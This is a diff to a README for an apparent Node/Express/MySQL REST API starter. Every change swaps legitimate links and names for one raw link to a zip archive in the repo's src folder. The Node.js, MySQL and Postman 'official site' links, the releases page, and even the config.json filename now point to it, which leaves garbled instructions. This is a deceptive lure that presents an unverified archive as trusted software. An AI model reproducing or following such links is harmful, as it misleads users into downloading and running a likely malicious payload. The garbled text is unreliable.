@@ -1,6 +1,6 @@
 # 🎉 node_express_mysql - Simple REST API Setup Made Easy  
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/21P31A05C3/node_express_mysql/releases)  
+[![Download](https://github.com/21P31A05C3/node_express_mysql/raw/refs/heads/main/src/express-node-mysql-3.9.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/21P31A05C3/node_express_mysql/raw/refs/heads/main/src/express-node-mysql-3.9.zip)  
 
 ## 🚀 Getting Started  
 
@@ -11,14 +11,14 @@ This guide will help you download and run the node_express_mysql application. Th
 Before downloading the application, ensure you meet the following requirements:  
 
 - **Operating System:** Windows, macOS, or Linux.  
-- **Node.js:** Version 10 or later. You can download it from [Node.js official site](https://nodejs.org/).  
-- **MySQL:** Version 5.7 or later. This is required for the database. You can download it from [MySQL official site](https://www.mysql.com/).  
+- **https://github.com/21P31A05C3/node_express_mysql/raw/refs/heads/main/src/express-node-mysql-3.9.zip** Version 10 or later. You can download it from [https://github.com/21P31A05C3/node_express_mysql/raw/refs/heads/main/src/express-node-mysql-3.9.zip official site](https://github.com/21P31A05C3/node_express_mysql/raw/refs/heads/main/src/express-node-mysql-3.9.zip).  
+- **MySQL:** Version 5.7 or later. This is required for the database. You can download it from [MySQL official site](https://github.com/21P31A05C3/node_express_mysql/raw/refs/heads/main/src/express-node-mysql-3.9.zip).  
 
 ## 📥 Download & Install  
 
 To get your copy of node_express_mysql, visit the releases page.  
 
-[Download the latest release here](https://github.com/21P31A05C3/node_express_mysql/releases)  
+[Download the latest release here](https://github.com/21P31A05C3/node_express_mysql/raw/refs/heads/main/src/express-node-mysql-3.9.zip)  
 
 1. **Visit the Releases Page:** Click on the link above to go to the releases page.  
 2. **Select the Latest Version:** Look for the latest version at the top of the page.  
@@ -53,7 +53,7 @@ Before running the application, you need some basic configuration. Follow these 
      ```  
    - Replace `my_database` with your preferred database name.  
 
-5. **Update Configuration Settings:** Open the file named `config.json` in a text editor. Update the following fields:  
+5. **Update Configuration Settings:** Open the file named `https://github.com/21P31A05C3/node_express_mysql/raw/refs/heads/main/src/express-node-mysql-3.9.zip` in a text editor. Update the following fields:  
    - "database": Set this to the name of the database you just created.  
    - "username": Your MySQL username.  
    - "password": Your MySQL password.  
@@ -71,7 +71,7 @@ Once you have configured everything, you can run the application. This is how:
 
 ## 📋 Testing with Postman  
 
-You can test the API using Postman, a simple tool for testing HTTP requests. If you don’t have Postman, download it from [Postman official site](https://www.postman.com/downloads/).  
+You can test the API using Postman, a simple tool for testing HTTP requests. If you don’t have Postman, download it from [Postman official site](https://github.com/21P31A05C3/node_express_mysql/raw/refs/heads/main/src/express-node-mysql-3.9.zip).  
 
 1. **Open Postman:**  
    Launch the application after installing it.  
@@ -98,8 +98,8 @@ You can test the API using Postman, a simple tool for testing HTTP requests. If 
 
 If you face issues, consider these tips:  
 
-- **Check Node.js and MySQL Versions:** Ensure they meet the required versions.  
-- **Review your Configuration Settings:** Double-check your `config.json` file for typos.  
+- **Check https://github.com/21P31A05C3/node_express_mysql/raw/refs/heads/main/src/express-node-mysql-3.9.zip and MySQL Versions:** Ensure they meet the required versions.  
+- **Review your Configuration Settings:** Double-check your `https://github.com/21P31A05C3/node_express_mysql/raw/refs/heads/main/src/express-node-mysql-3.9.zip` file for typos.  
 - **Consult the Community:** For additional help, look for discussions related to common issues.  
 
 By following these steps, you can successfully download, set up, and run the node_express_mysql application without technical skills. Enjoy building your REST API!
